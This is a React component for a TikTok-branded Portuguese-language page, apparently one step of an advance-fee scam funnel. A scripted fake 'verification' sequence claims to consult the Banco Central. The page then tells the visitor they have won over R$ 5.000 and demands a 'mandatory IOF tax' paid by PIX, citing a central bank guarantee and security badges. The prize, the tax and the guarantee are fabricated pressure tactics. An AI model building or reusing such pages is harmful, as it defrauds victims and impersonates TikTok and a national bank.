import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { AlertTriangle, CheckCircle, AlertCircle, Shield, Clock, Search, Database, Globe, Fingerprint } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import pixLogo from "@/assets/pix-logo-icon.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";
const RED = "#FE2B54";
const GREEN = "#10B981";
const IOF_TAX = 28.97;
const VALOR_GANHO = 5361.51;
const TOTAL_RECEBER = 5390.48;

const loadingSteps = [
  { text: "Verificando dados...", icon: Search, pct: 0 },
  { text: "Calculando impostos...", icon: Database, pct: 30 },
  { text: "Consultando Banco Central...", icon: Globe, pct: 60 },
  { text: "Validando identidade...", icon: Fingerprint, pct: 90 },
  { text: "Pronto!", icon: CheckCircle, pct: 100 },
];

const Upsell4 = () => {
  const [screen, setScreen] = useState<"loading" | "main">("loading");
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState(0);
  const [visible, setVisible] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell4", content_type: "iof" } });
  }, []);

  useEffect(() => {
    if (screen !== "loading") return;

    const stepTimings = [0, 800, 2000, 3500, 4500];
    const timers = stepTimings.map((at, i) =>
      setTimeout(() => {
        setCurrentStep(i);
        setProgress(loadingSteps[i].pct);
      }, at)
    );

    // Smooth progress between steps
    const smoothProgress = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) return 100;
        return prev + 0.5;
      });
    }, 50);

    const mainTimer = setTimeout(() => {
      clearInterval(smoothProgress);
      setScreen("main");
      requestAnimationFrame(() => setVisible(true));
    }, 5200);

    return () => {
      timers.forEach(clearTimeout);
      clearTimeout(mainTimer);
      clearInterval(smoothProgress);
    };
  }, [screen]);

  const handlePagar = () => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { page: "upsell4", value: IOF_TAX } });
    navigate("/pagamento");
  };

  const fmt = (v: number) => v.toFixed(2).replace(".", ",");

  const fadeUp = (delay: number): React.CSSProperties => ({
    opacity: visible ? 1 : 0,
    transform: visible ? "translateY(0)" : "translateY(20px)",
    transition: `opacity 0.6s cubic-bezier(0.16,1,0.3,1) ${delay}s, transform 0.6s cubic-bezier(0.16,1,0.3,1) ${delay}s`,
  });

  if (screen === "loading") {
    const StepIcon = loadingSteps[currentStep].icon;
    return (
      <div style={{
        fontFamily: FONT, background: "#F5F5F5", minHeight: "100dvh",
        display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 24,
      }}>
        <div style={{
          background: "#fff", borderRadius: 20, padding: "40px 28px 32px",
          boxShadow: "0 4px 32px rgba(0,0,0,0.08), 0 1px 4px rgba(0,0,0,0.04)",
          textAlign: "center", width: "100%", maxWidth: 360,
          animation: "slideUp 0.6s cubic-bezier(0.16,1,0.3,1)",
        }}>
          {/* Animated icon */}
          <div style={{
            width: 64, height: 64,
            background: progress >= 100 ? GREEN : `linear-gradient(135deg, ${RED}, #FF6B8A)`,
            borderRadius: 16,
            display: "flex", alignItems: "center", justifyContent: "center",
            margin: "0 auto 20px",
            boxShadow: progress >= 100
              ? `0 6px 24px rgba(16,185,129,0.25)`
              : `0 6px 24px rgba(254,43,84,0.2)`,
            animation: "iconFloat 3s ease-in-out infinite",
            transition: "background 0.5s ease, box-shadow 0.5s ease",
            position: "relative" as const,
          }}>
            <StepIcon size={26} color="#fff" style={progress < 100 ? { animation: "spinSlow 3s linear infinite" } : {}} />
            <div style={{
              position: "absolute", inset: -6,
              border: `2px solid ${progress >= 100 ? "rgba(16,185,129,0.15)" : "rgba(254,43,84,0.1)"}`,
              borderRadius: 20,
              animation: "ringPulse 2s ease-in-out infinite",
              transition: "border-color 0.5s ease",
            }} />
          </div>

          <p style={{
            fontSize: 15, color: "#000", fontWeight: 700, marginBottom: 4,
            transition: "opacity 0.3s ease",
          }}>
            {loadingSteps[currentStep].text}
          </p>
          <p style={{ fontSize: 11, color: "#aaa", marginBottom: 24, fontWeight: 500 }}>
            Processando sua solicitação
          </p>

          {/* Progress bar */}
          <div style={{ width: "100%", height: 4, background: "#F1F1F3", borderRadius: 2, overflow: "hidden", marginBottom: 24 }}>
            <div style={{
              width: `${Math.min(progress, 100)}%`, height: "100%",
              background: progress >= 100 ? GREEN : `linear-gradient(90deg, ${RED}, #FF6B8A)`,
              borderRadius: 2, transition: "width 0.3s ease, background 0.5s ease",
              boxShadow: progress >= 100 ? `0 0 8px rgba(16,185,129,0.4)` : `0 0 8px rgba(254,43,84,0.3)`,
            }} />
          </div>

          {/* Step indicators */}
          <div style={{ display: "flex", justifyContent: "center", gap: 6 }}>
            {loadingSteps.map((_, i) => (
              <div key={i} style={{
                width: i <= currentStep ? 20 : 6, height: 6, borderRadius: 3,
                background: i <= currentStep ? (i === currentStep && progress < 100 ? RED : GREEN) : "#E8E8E8",
                transition: "all 0.4s cubic-bezier(0.16,1,0.3,1)",
              }} />
            ))}
          </div>

          <p style={{ fontSize: 10, color: "#bbb", marginTop: 20, fontWeight: 500 }}>
            Conexão criptografada • SSL 256-bit
          </p>
        </div>

        <style>{`
          @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
          }
          @keyframes iconFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-6px); }
          }
          @keyframes spinSlow {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
          }
          @keyframes ringPulse {
            0%, 100% { opacity: 0.4; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.08); }
          }
        `}</style>
      </div>
    );
  }

  return (
    <div style={{ fontFamily: FONT, background: "#F5F5F5", minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{
        width: "100%", background: "#fff", padding: "14px 0",
        borderBottom: "1px solid #eee",
        display: "flex", justifyContent: "center",
        position: "sticky", top: 0, zIndex: 100,
        boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
      }}>
        <img src={tiktokLogo} alt="TikTok" style={{ height: 22 }} loading="eager" decoding="async" />
      </div>

      {/* Alert Banner */}
      <div style={{
        background: "#FFF8E1", padding: "10px 16px",
        display: "flex", alignItems: "center", gap: 8,
        borderBottom: "1px solid #FFE082",
        boxShadow: "0 1px 4px rgba(0,0,0,0.04)",
      }}>
        <AlertTriangle size={16} color="#F59E0B" />
        <span style={{ fontSize: 12, fontWeight: 700, color: "#92400E" }}>Imposto (IOF) obrigatório</span>
      </div>

      {/* Container */}
      <div style={{ maxWidth: 449, margin: "0 auto", width: "100%", padding: "16px 12px 110px" }}>

        {/* Title Card */}
        <div style={{
          ...fadeUp(0.05),
          background: "#fff", borderRadius: 16, padding: "24px 20px",
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
        }}>
          <h1 style={{ fontSize: 16, fontWeight: 700, color: "#000", marginBottom: 8 }}>
            Imposto sobre Operações Financeiras (IOF)
          </h1>
          <p style={{ fontSize: 13, color: "#555", lineHeight: 1.6, marginBottom: 6 }}>
            O pagamento do IOF é obrigatório e exigido pelo{" "}
            <strong style={{ color: "#000" }}>Banco Central do Brasil (Lei nº 8.894/94)</strong>
          </p>
          <p style={{ fontSize: 12, color: RED, lineHeight: 1.5 }}>
            <span style={{ fontWeight: 700 }}>* </span>
            É necessário realizar o pagamento do IOF para receber o valor acumulado.
          </p>
        </div>

        {/* Summary Card */}
        <div style={{
          ...fadeUp(0.15),
          background: "#fff", borderRadius: 16, padding: "20px",
          marginTop: 12,
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
        }}>
          <p style={{ fontSize: 14, fontWeight: 700, color: "#000", marginBottom: 14 }}>Resumo</p>

          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 0", borderTop: "1px solid #F1F1F3", borderBottom: "1px solid #F1F1F3" }}>
            <span style={{ fontSize: 13, color: "#666" }}>Valor ganho</span>
            <span style={{ fontSize: 14, fontWeight: 700, color: "#000" }}>R$ {fmt(VALOR_GANHO)}</span>
          </div>

          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 0", borderBottom: "1px solid #F1F1F3" }}>
            <div>
              <span style={{ fontSize: 13, color: "#666" }}>Valor a ser pago (IOF)</span>
              <p style={{ fontSize: 11, color: "#aaa", margin: "2px 0 0" }}>Imposto sobre Operações Financeiras</p>
            </div>
            <span style={{ fontSize: 14, fontWeight: 700, color: RED }}>- R$ {fmt(IOF_TAX)}</span>
          </div>

          <div style={{
            display: "flex", justifyContent: "space-between", alignItems: "center",
            padding: "14px 8px", background: "rgba(16,185,129,0.04)", borderRadius: 8, marginTop: 4,
          }}>
            <span style={{ fontSize: 14, fontWeight: 700, color: "#000" }}>Total a receber</span>
            <span style={{ fontSize: 18, fontWeight: 800, color: GREEN, animation: "countPulse 3s ease-in-out infinite" }}>
              R$ {fmt(TOTAL_RECEBER)}
            </span>
          </div>

          <div style={{
            display: "flex", alignItems: "center", gap: 8,
            background: "#FFF8E1", padding: "10px 12px", borderRadius: 10, marginTop: 12,
            boxShadow: "inset 0 1px 0 rgba(255,255,255,0.6)",
          }}>
            <AlertCircle size={14} color="#F59E0B" />
            <span style={{ fontSize: 11, color: "#666", lineHeight: 1.4 }}>
              O pagamento de R$ {fmt(TOTAL_RECEBER)} será processado via PIX imediatamente.
            </span>
          </div>
        </div>

        {/* Guarantee Card */}
        <div style={{
          ...fadeUp(0.25),
          background: "#fff", borderRadius: 16, padding: "16px 20px",
          marginTop: 12,
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
          display: "flex", alignItems: "center", gap: 12,
        }}>
          <div style={{
            width: 36, height: 36, background: GREEN, borderRadius: "50%",
            display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
            boxShadow: `0 3px 12px rgba(16,185,129,0.25)`,
            animation: "softPulse 2.5s ease-in-out infinite",
          }}>
            <CheckCircle size={18} color="#fff" />
          </div>
          <div>
            <p style={{ fontSize: 13, fontWeight: 700, color: "#000", marginBottom: 2 }}>Garantia de recebimento</p>
            <p style={{ fontSize: 11, color: "#666", lineHeight: 1.4 }}>
              O valor de R$ {fmt(TOTAL_RECEBER)} é garantido pelo Banco Central do Brasil
            </p>
          </div>
        </div>

        {/* Payment Method Card */}
        <div style={{
          ...fadeUp(0.3),
          background: "#fff", borderRadius: 16, padding: "18px 20px",
          marginTop: 12,
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
        }}>
          <p style={{ fontSize: 14, fontWeight: 700, color: "#000", marginBottom: 12 }}>Método de pagamento</p>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
            <img src={pixLogo} alt="PIX" style={{ height: 24 }} />
          </div>
          <div style={{
            display: "flex", alignItems: "center", gap: 8,
            background: "#F8F9FB", padding: "10px 12px", borderRadius: 10,
            boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8), 0 1px 3px rgba(0,0,0,0.03)",
          }}>
            <AlertCircle size={13} color="#848286" />
            <span style={{ fontSize: 11, color: "#666", lineHeight: 1.4 }}>
              Pague com PIX! Pagamentos simples, práticos e realizados em segundos.
            </span>
          </div>
        </div>

        {/* CTA */}
        <div style={{ ...fadeUp(0.35), marginTop: 16 }}>
          <button
            onClick={handlePagar}
            style={{
              width: "100%", border: 0, borderRadius: 99,
              padding: "18px 16px", fontSize: 15, fontWeight: 700,
              cursor: "pointer", color: "#fff", background: "#003772",
              fontFamily: FONT, letterSpacing: "0.2px",
              boxShadow: "0 6px 24px rgba(0,55,114,0.25), 0 2px 6px rgba(0,55,114,0.12), inset 0 1px 0 rgba(255,255,255,0.1)",
              transition: "transform 0.15s ease",
              animation: "ctaGlowBlue 2s ease-in-out infinite",
            }}
            onMouseDown={e => (e.currentTarget.style.transform = "scale(0.97)")}
            onMouseUp={e => (e.currentTarget.style.transform = "scale(1)")}
            onMouseLeave={e => (e.currentTarget.style.transform = "scale(1)")}
          >
            Pagar Imposto — R$ {fmt(IOF_TAX)}
          </button>
        </div>

        {/* Security footer */}
        <div style={{
          ...fadeUp(0.4),
          display: "flex", flexDirection: "column", alignItems: "center", gap: 6, marginTop: 16,
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11, color: "#aaa", fontWeight: 500 }}>
            <Shield size={11} color={GREEN} />
            Pagamento 100% seguro e protegido
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11, color: "#aaa", fontWeight: 500 }}>
            <Clock size={11} />
            Processamento instantâneo via PIX
          </div>
        </div>
      </div>

      <style>{`
        @keyframes softPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.06); }
        }
        @keyframes countPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.03); }
        }
        @keyframes ctaGlowBlue {
          0%, 100% { box-shadow: 0 6px 24px rgba(0,55,114,0.25), 0 2px 6px rgba(0,55,114,0.12), inset 0 1px 0 rgba(255,255,255,0.1); }
          50% { box-shadow: 0 8px 32px rgba(0,55,114,0.35), 0 4px 12px rgba(0,55,114,0.18), inset 0 1px 0 rgba(255,255,255,0.1); }
        }
      `}</style>
    </div>
  );
};

export default Upsell4;
